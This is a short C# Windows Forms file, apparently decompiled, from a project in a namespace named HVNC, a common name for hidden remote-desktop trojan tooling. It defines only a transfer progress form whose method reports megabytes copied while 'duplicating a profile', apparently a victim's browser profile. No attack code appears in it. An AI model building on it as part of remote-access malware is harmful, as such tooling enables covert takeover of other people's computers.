using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace HVNC
{
    public partial class FrmTransfer : Form
    {
        public int int_0;

        public ProgressBar DuplicateProgesse
        {
            get
            {
                return this.DuplicateProgess;
            }
            set
            {
                DuplicateProgess = value;
            }
        }

        public Label FileTransferLabele
        {
            get
            {
                return this.FileTransferLabel;
            }
            set
            {
                FileTransferLabel = value;
            }
        }

        public FrmTransfer()
        {
            int_0 = 0;
            InitializeComponent();
        }

        private void FrmTransfer_Load(object sender, EventArgs e)
        {

        }

        public void DuplicateProfile(int int_1)
        {

            if (int_1 > int_0)
            {
                int_1 = int_0;
            }
            
            FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";


            DuplicateProgess.Value = int_1;
        }

    }
}
